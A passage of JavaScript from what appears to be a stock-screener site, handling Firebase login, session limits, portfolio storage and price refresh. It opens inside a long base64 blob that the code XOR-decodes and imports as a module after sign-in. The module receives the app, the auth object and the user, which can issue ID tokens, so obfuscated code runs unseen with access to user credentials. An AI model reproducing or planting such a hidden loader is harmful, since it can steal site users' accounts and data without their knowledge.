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";
function unpack(t) {
  const b = Uint8Array.from(atob(t), (c) => c.charCodeAt(0));
  for (let i = 0; i < b.length; i++) b[i] ^= (i * 7 + 13) & 255;
  return new TextDecoder().decode(b);
}
async function loadExt(u) {
  if (!PACK) return;
  const url = URL.createObjectURL(new Blob([unpack(PACK)], { type: "text/javascript" }));
  try {
    const m = await import(url);
    await m.default({ app, auth, user: u, gated: GATED, addItem, syncLock, esc, $ });
  } catch (e) { console.warn("add-on:", e); }
  finally { URL.revokeObjectURL(url); }
}
idle(presence);                                         // online counter: after the page has settled, never before it shows
idle(countVisitor, 4000);

// ---------- page wiring ----------
const SIGNED_HINT = "hni_signed";                          // "1" = signed in last time (only a hint: Fundamentals checks for real)
const hinted = () => { try { return localStorage.getItem(SIGNED_HINT) === "1"; } catch (e) { return false; } };
let current = null;
const ready = new Promise((resolve) => {
  onAuthStateChanged(auth, async (u) => {
    if (u && expired(u)) { await signOut(auth); u = null; }   // 7-day session limit
    current = u;
    try { localStorage.setItem(SIGNED_HINT, u ? "1" : "0"); } catch (e) {}   // lets the next visit open Fundamentals instantly
    resolve();
    if (GATED && !u) {                                        // no login: back to the screener with the popup open
      location.replace(HOME + "?login=" + encodeURIComponent(location.pathname.replace(/^\//, "") + location.hash));
      return;
    }
    if (GATED) document.documentElement.classList.add("auth-ok");   // show the page at once
    else paintSlot(u);                                         // screener: Login button or the user menu
    if (!u) return;
    // Portfolio tab: the page saves / loads the user's holdings through this (Firestore hni_portfolio/{uid}, owner only)
    window.hniStore = {
      load: async () => { await needFS(); const d = await getDoc(doc(db, PORTFOLIO, u.uid)); return d.exists() ? d.data() : {}; },             // {txns, rates} (or old {items})
      save: async (data) => { await needFS(); return setDoc(doc(db, PORTFOLIO, u.uid), { txns: data.txns || [], rates: data.rates || {}, updated: serverTimestamp() }); },
      market: async () => { await needFS(); const d = await getDoc(doc(db, ...MARKET)); return d.exists() ? d.data() : null; },
      canRefresh: () => !!LTP_HOOK,                          // every signed-in user
      // start the live-price job → {ok} | {error, running}
      refresh: async () => {
        const r = await fetch(LTP_HOOK, { method: "POST", headers: { Authorization: "Bearer " + await u.getIdToken() } });
        return r.json().catch(() => ({ error: "HTTP " + r.status }));
      },
    };
    window.dispatchEvent(new Event("hni-ready"));
    if (GATED) showUser(u);
    idle(() => { record(u); loadExt(u); }, 1500);
  });
});

if (!GATED) {
  // screener: the Fundamentals button. Its tap is caught by a small script in the page itself (so the FIRST tap works
  // even before this file has loaded): it disables the button, shows "Checking login…" and then calls this.
  window.hniAuthGo = async (href) => {
    window.hniPending = null;
    // signed in last time → go at once (the Fundamentals page confirms the login itself, and sends you back if needed)
    if (current || hinted()) { location.href = href; return; }
    await ready;
    if (current) { location.href = href; return; }
    if (window.hniDone) window.hniDone();                      // not signed in: "Checking login…" → the login box
    openPopup(href);
  };
  if (window.hniPending) window.hniAuthGo(window.hniPending);   // tapped while this file was still loading
  // signed-in visitors: fetch the Fundamentals page quietly in the background, so it opens instantly (not for everyone:
  // it is ~260 KB, and free hosting has a daily transfer limit)
  ready.then(() => {
    const c = navigator.connection;
    if (!current || (c && (c.saveData || /2g/.test(c.effectiveType || "")))) return;
    const a = document.querySelector("[data-auth-link]");
    if (!a) return;
    idle(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = a.href; document.head.appendChild(l); }, 3000);
  });
  const want = new URLSearchParams(location.search).get("login");
  if (want != null) {
    history.replaceState(null, "", location.pathname + location.hash);          // clean the address bar
    ready.then(() => {
      let target = "fundamentals";                                              // only pages on this site
      try { const t = new URL(want, location.href); if (want && t.origin === location.origin) target = t.pathname + t.hash; } catch (e) {}
      if (current) location.href = target; else openPopup(target);
    });
  }
}
